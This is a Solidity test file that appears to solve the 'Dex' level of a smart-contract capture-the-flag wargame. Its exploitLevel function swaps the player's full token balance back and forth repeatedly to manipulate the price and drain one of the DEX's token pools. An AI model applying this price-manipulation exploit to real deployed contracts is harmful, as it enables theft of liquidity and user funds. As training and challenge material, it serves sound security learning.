// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
pragma experimental ABIEncoderV2;

import "../src/levels/Dex.sol";
import "../src/levels/DexFactory.sol";
import "./utils/BaseTest.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
contract TestDex is BaseTest{
    using SafeMath for uint256;
    Dex level;
    ERC20 token1;
    ERC20 token2;
    constructor() public{
        levelFactory = new DexFactory();
    }

    function setUp() public override{
        super.setUp();
    }
    function testRunLevel() public{
        runLevel();
    }
   function setupLevel() internal override{
        levelAddress = payable(this.createLevelInstance(true));
        level = Dex(levelAddress);
                
        token1 = ERC20(level.token1());
        token2 = ERC20(level.token2());
        assertEq(token1.balanceOf(address(level)), 100);
        assertEq(token2.balanceOf(address(level)), 100);
    }

    function exploitLevel() internal override{
        vm.startPrank(player);

        //approve token to contract for transaction 
        token1.approve(address(level), 2**256 - 1);
        token2.approve(address(level), 2**256 - 1);

        trade(token1,token2);
        log_named_uint("dex balance of token1", token1.balanceOf(address(level)));
        log_named_uint("dex balance of token2", token2.balanceOf(address(level)));
        trade(token2,token1);
        log_named_uint("dex balance of token1", token1.balanceOf(address(level)));
        log_named_uint("dex balance of token2", token2.balanceOf(address(level)));
        trade(token1,token2);
        log_named_uint("dex balance of token1", token1.balanceOf(address(level)));
        log_named_uint("dex balance of token2", token2.balanceOf(address(level)));
        trade(token2,token1);
        log_named_uint("dex balance of token1", token1.balanceOf(address(level)));
        log_named_uint("dex balance of token2", token2.balanceOf(address(level)));
        trade(token1,token2);
        log_named_uint("dex balance of token1", token1.balanceOf(address(level)));
        log_named_uint("dex balance of token2", token2.balanceOf(address(level)));

        level.swap(address(token2), address(token1), 45);
        log_named_uint("dex balance of token1", token1.balanceOf(address(level)));
        log_named_uint("dex balance of token2", token2.balanceOf(address(level)));

        assertEq(token1.balanceOf(address(level)) == 0 || token2.balanceOf(address(level)) == 0, true);

        vm.stopPrank();
    }

    function trade(ERC20 from,ERC20 to) public{
        level.swap(address(from), address(to), from.balanceOf(player));
    }
}